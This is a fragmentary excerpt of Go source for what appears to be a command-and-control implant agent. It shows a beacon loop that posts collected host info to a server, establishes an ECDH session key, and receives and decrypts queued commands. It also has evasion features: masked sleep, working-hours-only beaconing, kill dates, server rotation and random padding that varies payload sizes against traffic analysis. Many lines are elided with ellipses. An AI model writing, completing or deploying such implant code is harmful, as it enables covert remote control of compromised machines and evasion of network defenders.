				...
				if dataMap, ok := apiResp.Data.(map[string]any); ok {
					if serverPub, ok := dataMap["ecdh_pub"].(string); ok && serverPub != "" {
						...
						if err == nil {
							...
							dbgf("[+] ECDH handshake complete — session key established\n")
						}
					}
				}
			}
...
// Beacon is the B1 single-request beacon cycle.
// It sends agent info + optional last result in one POST and returns the next
// pending command (nil if the queue is empty).  ECDH key exchange is embedded
// when no session key has been established yet.
func (a *Agent) Beacon(lastResult *types.CommandResult) (*types.Command, error) {
	agentInfo := a.CollectInfo()
	...
	// Embed ephemeral ECDH public key if no session is established yet
	var ecdhSession *crypto.ECDHSession
	if a.sessionMgr == nil {
		var err error
		ecdhSession, err = crypto.NewECDHSession()
	...
	url := a.cfg.ServerURL + a.profile().BeaconPathForAgent(a.ID)
	...
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("beacon failed: %d — %s", resp.StatusCode, string(b))
	}
	...
	var apiResp types.APIResponse
	if err := json.Unmarshal(b, &apiResp); err != nil {
		return nil, fmt.Errorf("unmarshal beacon response: %v", err)
	}
	...
	// Complete ECDH handshake if server returned its public key
	if ecdhSession != nil {
		if serverPub, ok := dataMap["ecdh_pub"].(string); ok && serverPub != "" {
			sessionKey, err := ecdhSession.DeriveSessionKey(serverPub)
			if err == nil {
	...
	rawCmd, ok := dataMap["command"]
	if !ok || rawCmd == nil {
		return nil, nil
	}

	var cmdData []byte
	if cmdMap, ok := rawCmd.(map[string]any); ok {
		if enc, ok := cmdMap["encrypted"].(string); ok && a.activeCrypto() != nil {
			decrypted, err := a.activeCrypto().DecryptData(enc)
			if err != nil {
				return nil, fmt.Errorf("decrypt command: %v", err)
			}
			...
			cmdData, _ = json.Marshal(cmdMap)
		}
	} else {
		cmdData, _ = json.Marshal(rawCmd)
	}
...
func (a *Agent) sleep(d time.Duration) {
	if a.cfg.SleepMasking {
		...
		agentexec.MaskedSleep(d, sensitive)
	} else {
		time.Sleep(d)
	}
}
...
func (a *Agent) Start() error {
	...
	// Initial beacon with retries (also performs ECDH if needed)
	for i := 0; i < a.cfg.MaxRetries; i++ {
		if _, err := a.Beacon(nil); err != nil {
			...
			dbgf("[+] Initial beacon successful\n")
			break
		}
	}

	var lastResult *types.CommandResult
	for a.isRunning {
		// ── Kill date check ───────────────────────────────────────────────────
		if a.cfg.KillDate != "" {
			killDate, err := time.Parse("2006-01-02", a.cfg.KillDate)
			if err == nil && time.Now().After(killDate) {
				dbgf("[*] Kill date %s reached — exiting\n", a.cfg.KillDate)
				return nil
			}
		}
		...
		if a.cfg.WorkingHoursOnly && a.cfg.WorkingHoursStart < a.cfg.WorkingHoursEnd {
			...
			if h < a.cfg.WorkingHoursStart || h >= a.cfg.WorkingHoursEnd {
				...
				dbgf("[*] Outside working hours — sleeping until %s\n", next.Format("15:04"))
				a.sleep(time.Until(next))
				continue
			}
		}

		// ── Single beacon: heartbeat + submit last result + get next command ──
		cmd, err := a.Beacon(lastResult)
		lastResult = nil
		if err != nil {
			dbgf("[!] Beacon: %v\n", err)
			a.rotateServer()
	...
	for a.isRunning {
		if a.cfg.KillDate != "" {
			if kd, err := time.Parse("2006-01-02", a.cfg.KillDate); err == nil && time.Now().After(kd) {
				dbgf("[*] Kill date reached — exiting\n")
				return nil
			}
		}
		if a.cfg.WorkingHoursOnly && a.cfg.WorkingHoursStart < a.cfg.WorkingHoursEnd {
...
// randPad returns a base64-encoded string of n random bytes for traffic padding.
...
// marshalPayload JSON-encodes v, injects a random _pad field to normalise
// payload sizes, then encrypts with the active key.
...
func (a *Agent) marshalPayload(v any) ([]byte, error) {
	// Inject random padding before encoding so payload size varies per beacon.
	var m map[string]any
	if asMap, ok := v.(map[string]any); ok {
		m = asMap
	} else {
		// Marshal then re-decode into a generic map so we can add _pad.
		tmp, err := json.Marshal(v)
		if err != nil {
			return nil, err
		}
		if err := json.Unmarshal(tmp, &m); err != nil {
			m = nil // fall through to plain marshal
		}
	}
	var raw []byte
	var err error
	if m != nil {
		b := make([]byte, 1)
		rand.Read(b) //nolint:errcheck
		m["_pad"] = randPad(16 + int(b[0])%113) // [16, 128] bytes
